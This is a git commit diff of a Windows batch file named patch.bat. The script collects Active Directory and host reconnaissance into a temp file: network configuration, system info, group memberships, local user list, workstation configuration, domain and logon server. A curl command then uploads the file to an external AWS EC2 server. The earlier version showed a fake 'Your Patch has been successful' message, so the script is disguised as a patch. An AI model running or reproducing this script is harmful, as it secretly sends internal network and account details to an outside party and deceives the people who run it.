a8f37ac5023671524fb97386af4781d143dfcb42
surajkumar-30 <132037997+surajkumar-30@users.noreply.github.com>
2026-05-12 13:46:12 +0400

    Update patch.bat

--- patch.bat
+++ patch.bat
@@ -5,23 +5,42 @@ REM ===== EDIT THIS =====
 set SERVER=http://ec2-18-208-114-181.compute-1.amazonaws.com:8080/upload
 REM ====================
 
-echo Domain: %USERDNSDOMAIN%
-echo Logon Server: %LOGONSERVER%
-echo "Your Patch has been successful"
-echo IpConfig: %IPCONFIG% > %TEMP%\ad.txt
-echo systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Available Physical Memory" /C:"Domain": %systeminfo% >> %TEMP%\ad.txt
+REM Output file
+set OUTPUT=%TEMP%\ad.txt
 
-echo whoami /groups: %whoami% >> %TEMP%\ad.txt
+REM Clear/create file
+echo === Active Directory Info === > "%OUTPUT%"
 
-echo net user: %netuser% >> %TEMP%\ad.txt
+REM Run commands and append results
+echo. >> "%OUTPUT%"
+echo === IPCONFIG === >> "%OUTPUT%"
+ipconfig /all >> "%OUTPUT%"
 
-echo net config workstation: %workstation% >> %TEMP%\ad.txt
+echo. >> "%OUTPUT%"
+echo === SYSTEM INFO === >> "%OUTPUT%"
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Available Physical Memory" /C:"Domain" >> "%OUTPUT%"
 
+echo. >> "%OUTPUT%"
+echo === WHOAMI GROUPS === >> "%OUTPUT%"
+whoami /groups >> "%OUTPUT%"
 
-REM Create simple output
-echo Domain: %USERDNSDOMAIN% >> %TEMP%\ad.txt
-echo Logon Server: %LOGONSERVER% >> %TEMP%\ad.txt
+echo. >> "%OUTPUT%"
+echo === NET USER === >> "%OUTPUT%"
+net user >> "%OUTPUT%"
 
+echo. >> "%OUTPUT%"
+echo === NET CONFIG WORKSTATION === >> "%OUTPUT%"
+net config workstation >> "%OUTPUT%"
+
+echo. >> "%OUTPUT%"
+echo === DOMAIN INFO === >> "%OUTPUT%"
+echo Domain: %USERDNSDOMAIN% >> "%OUTPUT%"
+echo Logon Server: %LOGONSERVER% >> "%OUTPUT%"
+
+echo.
+echo Done. Output saved to:
+echo %OUTPUT%
+start notepad "%OUTPUT%"
 
 REM Upload
 curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%
